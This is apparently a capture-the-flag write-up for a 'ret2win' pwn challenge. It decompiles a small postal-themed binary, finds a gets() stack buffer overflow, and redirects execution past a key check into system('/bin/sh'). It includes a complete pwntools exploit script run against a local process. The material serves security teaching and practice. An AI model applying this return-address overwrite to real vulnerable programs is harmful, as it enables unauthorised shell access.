### Tags: `ret2win`; `BOF`

## Challenge info:

We were give with a single binary file:
```c
└─$ ls
chall 
```

File info:
```c
└─$ file chall     
chall: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=74a5c012b47fb07debb2821d2849f371032f6a15, for GNU/Linux 3.2.0, not stripped
```
```c
└─$ checksec --file=chall 
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      Symbols   FORTIFY  Fortified       Fortifiable     FILE
Partial RELRO   No canary found   NX disabled   No PIE          No RPATH   No RUNPATH   47 Symbols  No     0               1               chall
```
* No protection is enabled

This is an easy chall

___
Code from ghidra:

`main()`:
```c
undefined8 main(void)
{
  setbuf(stdout,(char *)0x0);
  setbuf(stdin,(char *)0x0);
  setbuf(stderr,(char *)0x0);
  puts("Our modern and highly secure postal service never fails to deliver your package.\n");
  deliver();
  return 0;
}
```
`deliver()`:
```c
void deliver(void)
{
  int true;
  char buffer [32];
  
  puts("Where would you like to send your package?\n");
  puts("Some Options:\n0 Address Avenue\n1 Buffer Boulevard\n2 Canary Court\n");
  gets(buffer);
  true = strcmp(buffer,"0 Address Avenue");
  if (true == 0) {
    puts("Delivering to 0 Address Avenue...\n");
    avenue();
  }
  else {
    true = strcmp(buffer,"1 Buffer Boulevard");
    if (true == 0) {
      puts("Delivering to 1 Buffer Boulevard...\n");
      boulevard();
    }
    else {
      true = strcmp(buffer,"2 Canary Court");
      if (true == 0) {
        puts("Delivering to 2 Canary Court...\n");
        court();
      }
      else {
        puts("Sorry, we couldn\'t deliver your package. Returning to sender...\n");
      }
    }
  }
  return;
}
```
* we can straight away see a BOF (buffer overflow) vulnerbility inside the function:
  ```c
  char buffer [32];
  ...
  gets(buffer);
  ...
  ```
* other functions such as: `avenue()`, `boulevard()` and `court()` are just puts(text) so we pay no mind to it

`drive()`:
```c
void drive(long var)
{
  puts("Attempting secret delivery to 3 Dangerous Drive...\n");
  if (var == 0x48435344) {
    puts("Success! Secret package delivered.\n");
    system("/bin/sh");
  }
  else {
    puts("Need the secret key to deliver this package.\n");
  }
  return;
}
```
* this is a hidden function that isnt called in the main program
* we have `system("/bin/sh");` which spawn shell
* indicating a `ret2win` type of challenge

___
### Exploit:

Our objective is to overflow the buffer and overwrite RIP with the address of `drive()` to trigger `system("/bin/sh");` and get shell

We already know the size of `buffer`:
```c
char buffer [32];
```
We add another 8 bytes to fill the `rbp` space as well 

<img width="803" height="237" alt="image" src="https://github.com/user-attachments/assets/22de3949-80a2-4946-affe-0c35a380c9ce" />

Now, overwrite RIP with the address of `drive()`. However, as we notice from the code:
```c
 if (var == 0x48435344) {
    puts("Success! Secret package delivered.\n");
    system("/bin/sh");
  }
```
There is a check in order to reach the system()

We can easily bypass this by using different binary address in `drive()`, in this case:
```c
puts("Success! Secret package delivered.\n");
```
Let the program return here is great, skipping the check code

<img width="525" height="267" alt="image" src="https://github.com/user-attachments/assets/41ca4d1f-fae2-4321-9263-5764d9214213" />

Run the payload:

<img width="803" height="144" alt="image" src="https://github.com/user-attachments/assets/6dbbddb2-bfa9-440c-b440-04548f0dbb00" />

<img width="803" height="665" alt="image" src="https://github.com/user-attachments/assets/ee577e78-c613-4001-b35e-5fcbe6e2f5a7" />

And we have our shell and fake flag:

<img width="802" height="497" alt="image" src="https://github.com/user-attachments/assets/1c464eb7-932a-4882-aa43-7e68af40b274" />

___
Here is the full script:
`script.py`:
```python
from pwn import *

context.binary = exe = ELF("./chall", checksec=False)
context.log_level = "debug"

def GDB():
	gdb.attach(p, gdbscript='''
		br *deliver + 59
		br *deliver + 235

		br *drive + 31
		''')

p = process(exe.path)
GDB()

drive = p64(0x401211)
bin_sh = p64(0x401244)

payload = b'A' * 32 
payload += b'A' * 8
payload += bin_sh
p.sendline(payload)

p.interactive()
```





